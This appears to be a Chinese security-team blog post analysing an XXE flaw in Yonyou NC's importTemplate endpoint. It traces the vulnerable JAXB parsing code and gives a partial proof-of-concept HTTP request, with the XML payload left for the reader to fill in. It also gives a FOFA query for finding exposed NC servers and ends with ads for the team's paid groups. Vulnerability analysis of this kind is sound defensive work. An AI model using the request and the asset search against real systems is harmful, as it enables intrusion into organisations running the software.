#  用友NC importTemplate方法XXE漏洞分析  
原创 网络攻防情报小组  C4安全团队   2025-06-18 05:52  
  
## 前言  
  
这是一个礼拜一次的正经漏洞分析文章，也就照着漏洞代码来分析一下用友NC的XXE漏洞，看和用友U8C的XXE漏洞有何区别吧，文章首发于奇安信攻防社区  
  
源码文件已在内部知识圈公开，感兴趣的师傅可以  
文末扫码加入  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJSCuyicetwfkClYhKEP1GUcVEbiamfg7KBBk56lntgvGglCicKSnSfDEicHPmlEuOlXGveC9hiakF8CJYA/640?wx_fmt=gif&from=appmsg "")  
  
漏洞位于importTemplate  
接口处，文件路径为nc.uap.portal.action.importTemplate  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSCuyicetwfkClYhKEP1GUcVPhkODFrEjSnxyh3sde2RIZiasTB9kJEgV5uQYZCbqeZnqpGH1tO6ezA/640?wx_fmt=png&from=appmsg "")  
  
其中关键代码如下，我放文本框里面  
```
Map<String, MultipartFile> fileMap = req.getFileMap();  
List<MultipartFile> files = new ArrayList<>();
String billitem = req.getParameter("billitem");  
if ("null".equals(billitem) || StringUtils.isBlank(billitem)) {  
  AppInteractionUtil.showMessageDialog(NCLangRes4VoTransl.getNCLangRes().getStrByID("bd", "PortalTemplateAction-000000"));  
  return;  
}   
if (MapUtils.isNotEmpty(fileMap))  
  files.addAll(fileMap.values());   
String name = ((MultipartFile)files.get(0)).getOriginalFilename();  
InputStream in = ((MultipartFile)files.get(0)).getInputStream();  
try {  
  TemplateOperTools.doImPort(in, billitem);
```  
  
后端接收上传的文件内容输入以及参数billitem，之后将其传入TemplateOperTools.doImPort  
方法中  
  
盯着代码继续追踪方法，doImport代码如下  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSCuyicetwfkClYhKEP1GUcVQCUYhHPk9uF4OCvfKXPrn7xcARFBFmA9OhUv8V5nEJ3mREHbX7dDQw/640?wx_fmt=png&from=appmsg "")  
  
可以看到内容输入经过  
JaxbMarshalFactory方法解析  
  
  
来到漏洞的罪魁祸首那一段代码  
```
TemplatePackObj packObj = (TemplatePackObj)JaxbMarshalFactory.newIns().encodeXML(TemplatePackObj.class, xml)
```  
  
此处对输入的内容进行解析，并将其转换为TemplatePackObj  
对象  
  
因为使用了JAXB来进行解析XML外部实体，从而造成了XXE漏洞  
  
最终的POC如下  
```
POST /portal/pt/portaltemplate/importTemplate?pageId=login&billitem=1 HTTP/1.1
Content-Type: multipart/form-data; boundary=----123456
Host: 
------123456
Content-Disposition: form-data; name="file"; filename="1.txt"

<?xml version="1.0" encoding="UTF-8"?>
内容自行替换即可

------123456--
```  
  
  
相关资产搜索的FOFA语法  
```
app="用友-UFIDA-NC"

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSCuyicetwfkClYhKEP1GUcVfHRLpKIsYVNfTsDBl2EbsI1GfBTr1C6dJAK2D1jf1rQ4ntkupyL3eg/640?wx_fmt=png&from=appmsg "")  
  
直接构造个XML文档请求外部地址来验证下  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSCuyicetwfkClYhKEP1GUcVgRQtRn63jCkRQUU8rSIw9AYj1H7AnzFyYaeFZCFcyCDfxiaw2DgYrsA/640?wx_fmt=png&from=appmsg "")  
  
请求成功，dnslog接收到请求记录  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSCuyicetwfkClYhKEP1GUcVH5wbsiapPH1EcVPd639D116TBQKaHlWib5bABIGvEfURH9o5zc3aDg5w/640?wx_fmt=png&from=appmsg "")  
  
  
  
最后总结  
  
感兴趣的可以公众号私聊我  
进团队交流群，  
咨询问题，hvv简历投递，nisp和cisp考证都可以联系我  
  
**内部src培训视频，内部知识圈，可私聊领取优惠券，加入链接：https://wiki.freebuf.com/societyDetail?society_id=184**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSCuyicetwfkClYhKEP1GUcVqQHpxibajrsiacpWuasPbmC5gGB93EWh2vIAwgo6gSQ5nlCUbZLFsUWg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSCuyicetwfkClYhKEP1GUcV22w5E22DPrIDUb3oIiboXjHuvsBYdu47iaIYHC5DSAJhD4ISRNicl3TAQ/640?wx_fmt=png&from=appmsg "")  
  
**加入团队、加入公开群等都可联系微信：yukikhq，搜索添加即可。**  
  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJQSCTuiawtOw7G9JFaBeBc06sHdBhSTMMClOr5wLWmLYIl6Yry9n3ZIL97tylQib5YLOuJFxndeFMEg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
END  
  
  
  
  
  
